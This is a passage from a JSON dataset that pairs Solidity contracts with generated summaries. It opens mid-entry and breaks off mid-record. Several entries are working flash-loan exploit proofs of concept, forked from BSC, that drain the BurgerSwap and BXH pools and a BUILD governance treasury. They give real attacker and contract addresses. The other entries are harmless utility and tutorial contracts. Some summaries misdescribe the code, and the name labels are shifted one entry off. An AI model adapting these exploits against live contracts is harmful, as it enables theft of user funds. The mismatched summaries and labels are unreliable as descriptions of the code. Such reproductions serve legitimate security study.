hex\"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"\n    );\n    build.transferFrom(\n      address(BuildGovernance),\n      address(this),\n      build.balanceOf(address(BuildGovernance))\n    );\n    emit log_named_uint(\n      \"After exploiting, BUILD balance of attacker:\",\n      build.balanceOf(address(this))\n    );\n  }\n}\n",
        "summary": "This is a Solidity smart contract for testing a proposal and execution on a certain blockchain network. The contract imports two interfaces, CheatCodes and IBuildFinance, and the IERC20 contract for the ERC20 token handling. The contract then sets up a select fork and initializes a test function. The deployed contract deploys the proposal on the selected blockchain network and executes the proposal. The function logs the current balance of the contract before and after the proposal execution.",
        "id": "b58554ad-94cc-4002-8c39-173befc9272c",
        "api_seq": "BurgerSwap_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"forge-std/Test.sol\";\n\n// Attacker: 0x6c9f2b95ca3432e5ec5bcd9c19de0636a23a4994\n// Attack Contract: 0xae0f538409063e66ff0e382113cb1a051fc069cd\n// Objective: Drain funds in the vulnerable Burger LP contract: 0x7ac55ac530f2c29659573bde0700c6758d69e677 (Demax WBNB<>BURGER pair)\n// Attack Tx: https://phalcon.xyz/tx/bsc/0xac8a739c1f668b13d065d56a03c37a686e0aa1c9339e79fcbc5a2d0a6311e333\n//            https://bscscan.com/tx/0xac8a739c1f668b13d065d56a03c37a686e0aa1c9339e79fcbc5a2d0a6311e333\n\n// @Analyses (somewhat similar to Impossible Finance exploit)\n// https://lunaray.medium.com/burgerswap-attack-analysis-c0345541d69\n// https://quillhashteam.medium.com/burgerswap-flash-loan-attack-analysis-888b1911daef\n\ncontract Exploit is Test {    \n    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 private constant BURGER = IERC20(0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f);\n\n    IUniswapV2Pair private constant USDT_WBNB = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\n\n    IDemaxPlatform private constant demaxPlatform = IDemaxPlatform(0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0);  // router\n    IDemaxDelegate private constant demaxDelegate = IDemaxDelegate(0xd0dd735851C1Ca61d0324291cCD3959d2153A88d);  // factory\n\n    FAKE_TOKEN FAKE;\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 7781159);\n    }\n\n    function testExploit() public {\n        // BURGER and WBNB in Pair before: 164603 <> 3038\n        USDT_WBNB.swap(0, 6047132230250298663393, address(this), \"Flashloan 6047 WBNB\");\n        // BURGER and WBNB in Pair after: 53606 <> 622\n\n        console.log(\"BURGER exploited:\", BURGER.balanceOf(address(this)) / 1e18);\n        console.log(\"WBNB exploited:\", WBNB.balanceOf(address(this)) / 1e18);\n    }\n\n    function pancakeCall(address, uint, uint amount1, bytes memory) public {\n        // swap 6047 WBNB for 92677 BURGER (pump BURGER price)\n        WBNB.approve(address(demaxPlatform), type(uint).max);\n        BURGER.approve(address(demaxPlatform), type(uint).max);\n\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(BURGER);\n        demaxPlatform.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), type(uint).max);\n\n        // create FAKE token, create FAKE<>BURGER pair and add 100 FAKE <> 45452 BURGER liquidity (addLiquidity() creates Pair if Pair doesn't exist)\n        FAKE = new FAKE_TOKEN(address(this));\n\n        FAKE.approve(address(demaxPlatform), type(uint).max);\n        BURGER.approve(address(demaxDelegate), type(uint).max);\n        demaxDelegate.addLiquidity(address(FAKE), address(BURGER), 100, 45452 ether, 0, 0, type(uint).max);  // 47225 BURGER left after addLiquidity()\n\n        FAKE.enableExploit();\n\n        // use malicious path to swap 1 FAKE -> 45452 BURGER -> 4478 WBNB (will use false amounts which were already calculated before the inner swap) [Second swap]\n        //                          and another 45452 BURGER -> 4478 WBNB (same price, no slippage incurred) [First swap]\n    /*  \n        WBNB -> BURGER ----> FAKE <> BURGER \n\n        FAKE -----------------> BURGER -> WBNB\n            |               ^\n            v               |\n            BURGER -> WBNB  | \n    */\n        address[] memory path2 = new address[](3);\n        path2[0] = address(FAKE);\n        path2[1] = address(BURGER);\n        path2[2] = address(WBNB);\n        demaxPlatform.swapExactTokensForTokens(1 ether, 0, path2, address(this), type(uint).max);  // trigger transferFrom() hook in FAKE then enter()\n\n        // swap 494 WBNB for 108k BURGER (small amount of WBNB for large amount of BURGER) to bring back normal price\n        path[0] = address(WBNB);\n        path[1] = address(BURGER);\n        demaxPlatform.swapTokensForExactTokens(108791 ether, 494 ether, path, address(this), type(uint).max);\n\n        // repay 0.3% fee\n        WBNB.transfer(address(USDT_WBNB), amount1 * 1000 / 997);  \n    }\n\n    function enter() public {\n        // swap another 45452 BURGER for 4478 WBNB (this inner BURGER -> WBNB swap uses the correct reserves) and is not locked yet\n        address[] memory path = new address[](2);\n        path[0] = address(BURGER);\n        path[1] = address(WBNB);\n        demaxPlatform.swapExactTokensForTokens(45452 ether, 0, path, address(this), type(uint).max);\n\n        FAKE.disableExploit();\n    }\n}\n\ncontract FAKE_TOKEN {\n    uint256 public totalSupply = 100 ether;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    Exploit private immutable exploit;\n    bool private isExploiting;\n\n    constructor(address main) {\n        balanceOf[main] = 99 ether;\n        exploit = Exploit(main);\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        unchecked {\n            allowance[sender][msg.sender] -= amount;\n            balanceOf[sender] -= amount;\n            balanceOf[recipient] += amount;\n        }\n\n        if (isExploiting) {\n            exploit.enter();\n        }\n        return true;\n    }\n\n    function enableExploit() public {\n        isExploiting = true;\n    }\n\n    function disableExploit() public {\n        isExploiting = false;\n    }\n\n    function transfer(address, uint256) external pure returns (bool) {\n        return true;\n    }\n\n    function approve(address, uint256) external pure returns (bool) {\n        return true;\n    }\n}\n\n/* ---------------------- Interface ---------------------- */\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IDemaxPlatform {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] memory path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] memory path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IDemaxDelegate {\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\n}\n\ninterface IUniswapV2Pair {\n    function balanceOf(address) external view returns (uint256);\n    function skim(address to) external;\n    function sync() external;\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes memory data\n    ) external;\n}",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in the BurgerSwap decentralized exchange to drain funds from a specific LP contract. It uses a flash loan to manipulate the price of Burger token and swaps it for WBNB. It then creates a fake token and pair, adds liquidity to the vulnerable LP contract, and swaps the fake token for Burger and WBNB. The fake token's transferFrom() function triggers the enter() function in the exploit contract, allowing for another swap of Burger for WBNB. The exploit then repays the flash loan and disables the exploit. The contract also includes interfaces for various other contracts that it interacts with.",
        "id": "3dc1be75-57f4-4d54-9fd7-016f177335c9",
        "api_seq": "BXH_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Total Lost :  40085 USDT\n// Attacker : 0x81c63d821b7cdf70c61009a81fef8db5949ac0c9\n// Attack Contract : 0x4e77df7b9cdcecec4115e59546f3eacba095a89f\n// Vulnerable Contract : https://bscscan.com/address/0x27539b1dee647b38e1b987c41c5336b1a8dce663 \n// Attack Tx  0xa13c8c7a0c97093dba3096c88044273c29cebeee109e23622cd412dcca8f50f4\n\n\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\nIERC20 constant BXH = IERC20(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);\n\ncontract Attacker is Test {\n    IERC20 constant vUSDT = IERC20(0x19195aC5F36F8C75Da129Afca8f92009E292B84a);\n    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    IPancakeRouter constant bxhRouter = IPancakeRouter(payable(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01));\n\n    IPancakePair constant usdtwbnbpair =  IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // wbnb/usdt Pair\n    IPancakePair constant bxhusdtpair =  IPancakePair(0x919964B7f12A742E3D33176D7aF9094EA4152e6f); // bxh/usdt Pair\n    \n    TokenStakingPoolDelegate constant bxhtokenstaking = TokenStakingPoolDelegate(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663);\n\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 21727289);\n        cheat.label(address(BXH), \"BXH\");\n        cheat.label(address(usdt), \"USDT\");\n        cheat.label(address(wbnb), \"WBNB\");\n        cheat.label(address(pancakeRouter), \"PancakeRouter\");\n        cheat.label(address(usdtwbnbpair), \"usdt/wbnb Pair\");\n        cheat.label(address(bxhusdtpair), \"bxh/usdt Pair\");\n        cheat.label(address(bxhRouter), \"BXH Router\");\n    }\n\n    function testExploit() public {\n        \n        // Before attack need depoit first\n\n        // cheat.rollFork(21665464);\n        // cheat.prank(0x81C63d821b7CdF70C61009A81FeF8Db5949AC0C9);\n\n        // //emit log_named_decimal_uint(\"[Start]  VUSDT Balance Of 0x54f611135A9b88bbE23a8CF6C1310c59321F2717:\", vUSDT.balanceOf(address(0x54f611135A9b88bbE23a8CF6C1310c59321F2717)), 18);\n        // vUSDT.transfer(address(this), 5582000000000000000000);\n        // emit log_named_decimal_uint(\"[Start] contract VUSDT Balance is:\", vUSDT.balanceOf(address(this)), 18);\n\n        // vUSDT.approve(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, type(uint256).max);\n\n        // bxhtokenstaking.deposit(0, vUSDT.balanceOf(address(this)));\n        // emit log_named_decimal_uint(\"[Start] contract Despoit VUSDT \", vUSDT.balanceOf(address(this)), 18);\n\n        //cheat.rollFork(21727289);\n        \n        emit log_named_decimal_uint(\"[Start] BXH-USDT  Pair USDT Balance is :\" , usdt.balanceOf(address(0x919964B7f12A742E3D33176D7aF9094EA4152e6f)), 18);\n        usdtwbnbpair.swap(3178800000000000000000000, 0 ,address(this), \"0x\");\n\n        emit log_named_decimal_uint(\"[Over] Hacker USDT Balance is :\", usdt.balanceOf(address(this)), 18);    \n    \n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        console.log(\"[Flashloan] received\");\n        //approve bxh router for usdt\n        usdt.approve(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01, type(uint256).max);\n\n        address[] memory path = new address[](2);\n        path[0] = address(0x55d398326f99059fF775485246999027B3197955);\n        path[1] = address(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);\n\n        bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            usdt.balanceOf(address(this)) - 805614870582412124618,\n            1,\n            path,\n            address(this),\n            block.timestamp\n        );\n        emit log_named_decimal_uint(\"[Flashloan] now Hacker BXH balance is :\", BXH.balanceOf(address(this)), 18);\n\n        usdt.transfer(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, 805614870582412124618);\n\n        emit log_named_decimal_uint(\"[Flashloan] now bxh contract USDT balance is :\", usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)), 18);\n        \n        cheat.startPrank(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f);\n        bxhtokenstaking.deposit(0, 0);\n        usdt.transfer(address(this), usdt.balanceOf(address(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f)));\n        cheat.stopPrank();\n\n        emit log_named_decimal_uint(\"[Flashloan] Hacker USDT Balance is :\", usdt.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[Flashloan] bxh contract USDT Balance is :\", usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)), 18);\n\n        BXH.approve(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01, type(uint256).max);\n\n\n        address[] memory bxh_usdtpath = new address[](2);\n        bxh_usdtpath[0] = address(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);\n        bxh_usdtpath[1] = address(0x55d398326f99059fF775485246999027B3197955);\n\n        bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            BXH.balanceOf(address(this)),\n            1,\n            bxh_usdtpath,\n            address(this),\n            block.timestamp\n        );\n\n        emit log_named_decimal_uint(\"[Flashloan] Hacker USDT Balance is :\", usdt.balanceOf(address(this)), 18);\n\n        uint256 swapfee = amount0 * 26 / 10000;\n\n        usdt.transfer(address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE), amount0 + swapfee);\n\n    }\n    receive() external payable {}\n}\n\ninterface TokenStakingPoolDelegate {\n    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n    event DepositDelegate(\n        address indexed user,\n        address toUser,\n        uint256 indexed pid,\n        uint256 amount\n    );\n    event EmergencyWithdraw(\n        address indexed user,\n        uint256 indexed pid,\n        uint256 amount\n    );\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n    event PoolAdded(\n        uint256 _pid,\n        uint256 _allocPoint,\n        address _lpToken,\n        bool _enableBonus,\n        address _bonusToken,\n        address _swapPairAddress,\n        uint256 _lockSeconds,\n        uint256 _depositMin,\n        uint256 _depositMax\n    );\n    event PoolAllocateChanged(uint256 _pid, uint256 _allocPoint);\n    event PoolBonusChanged(\n        uint256 _pid,\n        bool _enableBonus,\n        address _bonusToken,\n        address _swapPairAddress,\n        uint256 _lockSeconds\n    );\n    event PoolDepositChanged(\n        uint256 _pid,\n        uint256 _depositMin,\n        uint256 _depositMax\n    );\n    event SetDelegate(bool, address);\n    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n\n    function add(\n        uint256 _allocPoint,\n        address _lpToken,\n        bool _enableBonus,\n        address _bonusToken,\n        address _swapPairAddress,\n        uint256 _lockSeconds,\n        uint256 _depositMin,\n        uint256 _depositMax,\n        bool _withUpdate\n    ) external;\n\n    function adminAddress() external view returns (address);\n\n    function batchPrepareRewardTable(uint256 spareCount)\n        external\n        returns (uint256);\n\n    function claimAllReward() external;\n\n    function claimBylpToken(address _lpToken) external;\n\n    function decayPeriod() external view returns (uint256);\n\n    function decayRatio() external view returns (uint256);\n\n    function decayTable(uint256) external view returns (uint256);\n\n    function delegateCaller() external view returns (address);\n\n    function deposit(uint256 _pid, uint256 _amount) external;\n\n    function depositByDelegate(\n        uint256 _pid,\n        address _toUser,\n        uint256 _amount\n    ) external;\n\n    function emergencyWithdraw(uint256 _pid) external;\n\n    function getITokenBlockRewardV(uint256 _lastRewardBlock)\n        external\n        view\n        returns (uint256);\n\n    function getITokenBlockRewardV(\n        uint256 _lastRewardBlock,\n        uint256 blocknumber\n    ) external view returns (uint256);\n\n    function getITokenBonusAmount(uint256 _pid, uint256 _amountInToken)\n        external\n        view\n        returns (uint256);\n\n    function iToken() external view returns (address);\n\n    function lockedToken(uint256 _pid, address _user)\n        external\n        view\n        returns (uint256);\n\n    function massUpdatePools() external;\n\n    function openDelegate() external view returns (bool);\n\n    function owner() external view returns (address);\n\n    function paused() external view returns (bool);\n\n    function pending(uint256 _pid, address _user)\n        external\n        view\n        returns (uint256, uint256);\n\n    function pendingAllReward(address _user)\n        external\n        view\n        returns (uint256, uint256);\n\n    function pendingBylpToken(address _lpToken, address _user)\n        external\n        view\n        returns (uint256, uint256);\n\n    function phase(uint256 blockNumber) external view returns (uint256);\n\n    function poolInfo(uint256)\n        external\n        view\n        returns (\n            address lpToken,\n            uint256 allocPoint,\n            uint256 lastRewardBlock,\n            uint256 accITokenPerShare,\n            uint256 totalAmount,\n            uint256 lockSeconds,\n            bool enableBonus,\n            address bonusToken,\n            address swapPairAddress,\n            uint256 depositMin,\n            uint256 depositMax\n        );\n\n    function poolLength() external view returns (uint256);\n\n    function renounceOwnership() external;\n\n    function rewardV(uint256 blockNumber) external view returns (uint256);\n\n    function safeGetITokenBlockReward(uint256 _lastRewardBlock)\n        external\n        returns (uint256);\n\n    function set(\n        uint256 _pid,\n        uint256 _allocPoint,\n        bool _withUpdate\n    ) external;\n\n    function setAdmin(address _adminAddress) external;\n\n    function setBonus(\n        uint256 _pid,\n        bool _enableBonus,\n        address _bonusToken,\n        address _swapPairAddress,\n        uint256 _lockSeconds\n    ) external;\n\n    function setDecayPeriod(uint256 _block) external;\n\n    function setDecayRatio(uint256 _ratio) external;\n\n    function setDelegate(bool open, address caller) external;\n\n    function setPause(bool _paused) external;\n\n    function setPoolDepositLimited(\n        uint256 _pid,\n        uint256 _depositMin,\n        uint256 _depositMax\n    ) external;\n\n    function setTokenPerBlock(uint256 _newPerBlock) external;\n\n    function startBlock() external view returns (uint256);\n\n    function tokenPerBlock() external view returns (uint256);\n\n    function totalAllocPoint() external view returns (uint256);\n\n    function transferOwnership(address newOwner) external;\n\n    function updatePool(uint256 _pid) external;\n\n    function userDepositInfo(\n        uint256,\n        address,\n        uint256\n    ) external view returns (uint256 orderTime, uint256 amount);\n\n    function userInfo(uint256, address)\n        external\n        view\n        returns (\n            uint256 amount,\n            uint256 rewardDebt,\n            uint256 rewardReceived,\n            uint256 lastReceived\n        );\n\n    function withdraw(uint256 _pid, uint256 _amount) external returns (uint256);\n\n    function withdrawBylpToken(address _lpToken, uint256 _amount) external;\n\n    function withdrawEmergency(address tokenaddress, address to) external;\n\n    function withdrawEmergencyNative(address to, uint256 amount) external;\n}\n",
        "summary": "This code defines a contract called \"Attacker\" that performs a flashloan attack on a vulnerable smart contract on the Binance Smart Chain. The vulnerable contract holds a staking pool for a token called BXH and allows users to deposit and withdraw tokens with interest. The attack contract first swaps a large amount of USDT for WBNB on the PancakeSwap DEX, then uses the swapped WBNB to add liquidity to a WBNB/USDT pair. Next, the contract uses the BXH staking pool to deposit a large amount of VUSDT tokens, which are then converted to USDT to be withdrawn later. The contract then executes a flashloan from the staking pool, using the borrowed USDT to buy a large amount of BXH tokens on the DEX. Finally, the contract swaps the BXH tokens back to USDT on the DEX and withdraws the exploited USDT tokens from the staking pool.",
        "id": "066c51d3-abc1-447b-9c30-21f05bf1f93c",
        "api_seq": "Bytes32AddressLib"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Library for converting between addresses and bytes32 values.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/Bytes32AddressLib.sol)\nlibrary Bytes32AddressLib {\n    function fromLast20Bytes(bytes32 bytesValue) internal pure returns (address) {\n        return address(uint160(uint256(bytesValue)));\n    }\n\n    function fillLast12Bytes(address addressValue) internal pure returns (bytes32) {\n        return bytes32(bytes20(addressValue));\n    }\n}\n",
        "summary": "This is a Solidity library that provides two functions for converting between addresses and bytes32 values. The `fromLast20Bytes` function takes a bytes32 value as input and returns the corresponding address by converting the last 20 bytes of the bytes32 value into an address. The `fillLast12Bytes` function takes an address value as input and returns a bytes32 value by converting the last 12 bytes of the address into bytes and filling the remaining 20 bytes with zeros.",
        "id": "0f2e0306-0130-4475-851d-71ae74783fc5",
        "api_seq": "Bytes32AddressLib.t"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\nimport {Bytes32AddressLib} from \"../utils/Bytes32AddressLib.sol\";\n\ncontract Bytes32AddressLibTest is DSTestPlus {\n    function testFillLast12Bytes() public {\n        assertEq(\n            Bytes32AddressLib.fillLast12Bytes(0xfEEDFaCEcaFeBEEFfEEDFACecaFEBeeFfeEdfAce),\n            0xfeedfacecafebeeffeedfacecafebeeffeedface000000000000000000000000\n        );\n    }\n\n    function testFromLast20Bytes() public {\n        assertEq(\n            Bytes32AddressLib.fromLast20Bytes(0xfeedfacecafebeeffeedfacecafebeeffeedfacecafebeeffeedfacecafebeef),\n            0xCAfeBeefFeedfAceCAFeBEEffEEDfaCecafEBeeF\n        );\n    }\n}\n",
        "summary": "This code defines a smart contract called \"Bytes32AddressLibTest\" and imports two libraries: \"DSTestPlus\" and \"Bytes32AddressLib\". The contract contains two functions, \"testFillLast12Bytes\" and \"testFromLast20Bytes\", which test the functionality of two methods from the \"Bytes32AddressLib\" library, \"fillLast12Bytes\" and \"fromLast20Bytes\" respectively. These methods manipulate bytes and convert them to Ethereum addresses in a particular format. The tests are done using the Solidity testing framework.",
        "id": "a385975f-69cf-4e12-a862-862f9c4600be",
        "api_seq": "bytes32ToString"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\n// Source: https://ethereum.stackexchange.com/a/2834/5093\n\ncontract MyContract {\n  bytes32 bts = \"foo\";\n  string str;\n\n  function MyContract() {\n    str = bytes32ToString(bts);\n  }\n\n  function bytes32ToString(bytes32 x) constant returns (string) {\n    bytes memory bytesString = new bytes(32);\n    uint charCount = 0;\n    for (uint j = 0; j < 32; j++) {\n      byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));\n      if (char != 0) {\n        bytesString[charCount] = char;\n        charCount++;\n      }\n    }\n    bytes memory bytesStringTrimmed = new bytes(charCount);\n    for (j = 0; j < charCount; j++) {\n      bytesStringTrimmed[j] = bytesString[j];\n    }\n    return string(bytesStringTrimmed);\n  }\n\n  function bytes32ArrayToString(bytes32[] data) returns (string) {\n    bytes memory bytesString = new bytes(data.length * 32);\n    uint urlLength;\n    for (uint i=0; i<data.length; i++) {\n      for (uint j=0; j<32; j++) {\n        byte char = byte(bytes32(uint(data[i]) * 2 ** (8 * j)));\n        if (char != 0) {\n          bytesString[urlLength] = char;\n          urlLength += 1;\n        }\n      }\n    }\n    bytes memory bytesStringTrimmed = new bytes(urlLength);\n    for (i=0; i<urlLength; i++) {\n      bytesStringTrimmed[i] = bytesString[i];\n    }\n    return string(bytesStringTrimmed);\n  }\n}\n",
        "summary": "This is a Solidity contract with two functions, `bytes32ToString` and `bytes32ArrayToString`. \n\nThe `bytes32ToString` function takes a `bytes32` variable as input and returns a string representation of it by iterating over the bytes in the input variable and converting them to an ASCII character. \n\nThe `bytes32ArrayToString` function takes an input array of `bytes32` variables and returns a string representation of them by iterating over each variable in the array and converting its bytes to an ASCII character, then concatenating all of the resulting strings together. \n\nThere are two variables defined in the contract, `bts` and `str`. `bts` is initialized with the value \"foo\" as a `bytes32` variable, and `str` is initialized as an empty string. In the contract constructor, the `bytes32ToString` function is called with `bts` as an argument, and the resulting string is assigned to `str`.",
        "id": "df102703-30a8-4708-bf4e-205f6fc3f906",
        "api_seq": "BytesToAddress"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function bytesToAddress(bytes _address) public returns (address) {\n    uint160 m = 0;\n    uint160 b = 0;\n\n    for (uint8 i = 0; i < 20; i++) {\n      m *= 256;\n      b = uint160(_address[i]);\n      m += (b);\n    }\n\n    return address(m);\n  }\n}\n",
        "summary": "This is a Solidity smart contract that defines a function called bytesToAddress(). When called, the function takes an input parameter of bytes and converts it to an Ethereum address type using a for loop and some bitwise operations. The function is publicly visible and will return the resulting Ethereum address.",
        "id": "343a2456-ddb8-4e2f-a277-8857cbb4736f",
        "api_seq": "Call"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract OtherContract {\n    uint256 private _x = 0; // \u72b6\u6001\u53d8\u91cfx\n    // \u6536\u5230eth\u4e8b\u4ef6\uff0c\u8bb0\u5f55amount\u548cgas\n    event Log(uint amount, uint gas);\n\n    fallback() external payable{}\n\n    // \u8fd4\u56de\u5408\u7ea6ETH\u4f59\u989d\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // \u53ef\u4ee5\u8c03\u6574\u72b6\u6001\u53d8\u91cf_x\u7684\u51fd\u6570\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f80\u5408\u7ea6\u8f6cETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // \u5982\u679c\u8f6c\u5165ETH\uff0c\u5219\u91ca\u653eLog\u4e8b\u4ef6\n        if(msg.value > 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // \u8bfb\u53d6x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\ncontract Call{\n    // \u5b9a\u4e49Response\u4e8b\u4ef6\uff0c\u8f93\u51facall\u8fd4\u56de\u7684\u7ed3\u679csuccess\u548cdata\n    event Response(bool success, bytes data);\n\n    function callSetX(address payable _addr, uint256 x) public payable {\n        // call setX()\uff0c\u540c\u65f6\u53ef\u4ee5\u53d1\u9001ETH\n        (bool success, bytes memory data) = _addr.call{value: msg.value}(\n            abi.encodeWithSignature(\"setX(uint256)\", x)\n        );\n\n        emit Response(success, data); //\u91ca\u653e\u4e8b\u4ef6\n    }\n\n    function callGetX(address _addr) external returns(uint256){\n        // call getX()\n        (bool success, bytes memory data) = _addr.call(\n            abi.encodeWithSignature(\"getX()\")\n        );\n\n        emit Response(success, data); //\u91ca\u653e\u4e8b\u4ef6\n        return abi.decode(data, (uint256));\n    }\n\n    function callNonExist(address _addr) external{\n        // call getX()\n        (bool success, bytes memory data) = _addr.call(\n            abi.encodeWithSignature(\"foo(uint256)\")\n        );\n\n        emit Response(success, data); //\u91ca\u653e\u4e8b\u4ef6\n    }\n}\n",
        "summary": "This is a Solidity smart contract code that contains two Solidity contracts. The `OtherContract` contract contains a private variable `_x`, a function to get the balance of the contract in Ether, a function to set the value of `_x` and accept Ether, and a function to return the value of `_x`. The `Call` contract contains functions to call the `setX` and `getX` functions from the `OtherContract`, and a function to call a non-existent function in the `OtherContract`. The `Call` contract also emits a `Response` event after each function call.",
        "id": "729c8d22-e91d-4634-b1b9-0734d72c31ce",
        "api_seq": "CallContract"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract OtherContract {\n    uint256 private _x = 0; // \u72b6\u6001\u53d8\u91cfx\n    // \u6536\u5230eth\u4e8b\u4ef6\uff0c\u8bb0\u5f55amount\u548cgas\n    event Log(uint amount, uint gas);\n    \n    // \u8fd4\u56de\u5408\u7ea6ETH\u4f59\u989d\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // \u53ef\u4ee5\u8c03\u6574\u72b6\u6001\u53d8\u91cf_x\u7684\u51fd\u6570\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f80\u5408\u7ea6\u8f6cETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // \u5982\u679c\u8f6c\u5165ETH\uff0c\u5219\u91ca\u653eLog\u4e8b\u4ef6\n        if(msg.value > 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // \u8bfb\u53d6x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\ncontract CallContract{\n    function callSetX(address _Address, uint256 x) external{\n        OtherContract(_Address).setX(x);\n    }\n\n    function callGetX(OtherContract _Address) external view returns(uint x){\n        x = _Address.getX();\n    }\n\n    function callGetX2(address _Address) external view returns(uint x){\n        OtherContract oc = OtherContract(_Address);\n        x = oc.getX();\n    }\n\n    function setXTransferETH(address otherContract, uint256 x) payable external{\n        OtherContract(otherContract).setX{value: msg.value}(x);\n    }\n}\n",
        "summary": "This code defines two Solidity contracts: `OtherContract` and `CallContract`. \n\n`OtherContract` defines a contract that has a private variable `_x`, an event `Log`, a function `getBalance` that returns the contract's current ETH balance, a function `setX` that updates the value of `_x` and logs an event if any ETH is transferred to the contract, and a function `getX` that returns the current value of `_x`. \n\n`CallContract` defines several functions that call functions from `OtherContract`, including `callSetX` that sets `_x` in `OtherContract` using the provided parameter, `callGetX` and `callGetX2` that both retrieve the current `_x` value from `OtherContract` using different methods, and `setXTransferETH` that sets the `_x` value in `OtherContract` using the provided parameter and also transfers ETH to `OtherContract`. \n\nThis code uses Solidity version 0.8.4 and specifies a license of MIT using the SPDX-License-Identifier notation.",
        "id": "9b087597-e816-4995-b2f7-e6eb2d43c314",
        "api_seq": "Carrot_exp"
    },
    {
